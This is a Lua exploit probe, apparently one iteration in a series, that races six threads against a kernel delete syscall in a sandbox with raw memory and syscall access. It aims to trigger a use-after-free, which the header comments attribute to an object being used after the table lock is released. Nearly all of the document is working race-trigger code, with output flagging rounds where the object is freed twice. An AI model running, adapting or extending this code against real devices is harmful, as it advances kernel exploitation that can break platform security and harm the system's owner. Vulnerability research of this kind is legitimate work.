-- CRASH_CLASS: RISKY
-- PROBE 496b: six threads released onto one id at the same instant
-- 495c had one thread and the parent, and the two calls never overlapped: the
-- second lookup always ran after the first free, so it saw a missing slot. The
-- delete body resolves the object under the table lock (0x3afc67 unlocks) and
-- uses it afterwards at 0x3afd0c, so the interesting shape is several callers
-- that resolve the same object before any of them frees it. Six pre-built
-- callables waiting on one gate word give that pile-up in native code, with no
-- Lua work between the release and the syscall.
print("=== PROBE 496b: six-way delete pile-up ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function addrnum(v)
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return to_num(v)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local THREADS = 6
local data = memory.alloc(0x2000)
local out  = memory.alloc(0x100)
local ids  = memory.alloc(0x100)
local res  = memory.alloc(0x400 * THREADS)
local gate = memory.alloc(0x100)
local sc669, sc664, sc662 = make_syscall(669), make_syscall(664), make_syscall(662)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
local function create()
  for off = 0, 0x100 - 1, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local ok = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  if not ok then return nil end
  return to_num(memory.read_dword(out))
end

local function body_for(slot)
  local txt = "local t = {}\n" ..
    "for k,v in pairs(syscall.pipe) do t[k] = v end\n" ..
    "t.syscall_no = 662\n" ..
    "setmetatable(t, getmetatable(syscall.pipe))\n" ..
    "while memory.read_dword(GATE) == 0 do end\n" ..
    "memory.write_dword(GATE + 4 + SLOT * 4, 1)\n" ..
    "pcall(function() t(IDS, 1, RES) end)\n" ..
    "memory.write_dword(GATE + 0x40 + SLOT * 4, 1)\n"
  txt = txt:gsub("GATE", tostring(addrnum(gate)))
  txt = txt:gsub("IDS", tostring(addrnum(ids)))
  txt = txt:gsub("RES", tostring(addrnum(res) + slot * 0x400))
  txt = txt:gsub("SLOT", tostring(slot))
  return txt
end

local rounds = 20
local done = 0
local hit = 0
for r = 1, rounds do
  local id = create()
  if not id then print(string.format("round %d create failed", r)); break end
  pcall(function() memory.write_dword(ids, id) end)
  pcall(function() return sc664(uint64(ids), uint64(1), uint64(res)) end)
  for off = 0, 0xFF - 1, 4 do pcall(function() memory.write_dword(gate + off, 0) end) end
  for slot = 1, THREADS do
    for off = 0, 0x40 - 1, 4 do
      pcall(function() memory.write_dword(res + slot * 0x400 + off, 0x77777777) end)
    end
  end
  local threads = {}
  local spawned = true
  for slot = 1, THREADS do
    local ok, thr = pcall(run_lua_code_in_new_thread, body_for(slot), { async = true })
    if not ok or type(thr) ~= "table" then print(string.format("round %d spawn %d failed", r, slot)); spawned = false; break end
    threads[slot] = thr
  end
  if not spawned then break end
  local spins = 0
  while to_num(memory.read_dword(gate + 4 + THREADS * 4)) < THREADS and spins < 8000000 do
    local n = 0
    for slot = 1, THREADS do n = n + to_num(memory.read_dword(gate + 4 + slot * 4)) end
    if n >= THREADS then break end
    spins = spins + 1
  end
  pcall(function() memory.write_dword(gate, 1) end)
  local jspins = 0
  while jspins < 8000000 do
    local n = 0
    for slot = 1, THREADS do n = n + to_num(memory.read_dword(gate + 0x40 + slot * 4)) end
    if n >= THREADS then break end
    jspins = jspins + 1
  end
  for slot = 1, THREADS do pcall(function() return threads[slot]:join() end) end
  local zeros = 0
  local line = string.format("round %2d id=%d", r, id)
  for slot = 1, THREADS do
    local st = to_num(memory.read_dword(res + slot * 0x400))
    if st == 0 then zeros = zeros + 1 end
    line = line .. string.format(" %#x", st)
  end
  if zeros > 1 then hit = hit + 1; line = line .. "  <-- TWO CLEAN DELETES" end
  print(line)
  done = done + 1
end
print(string.format("rounds=%d multi-clean=%d", done, hit))
print("=== PROBE 496b COMPLETE ===")
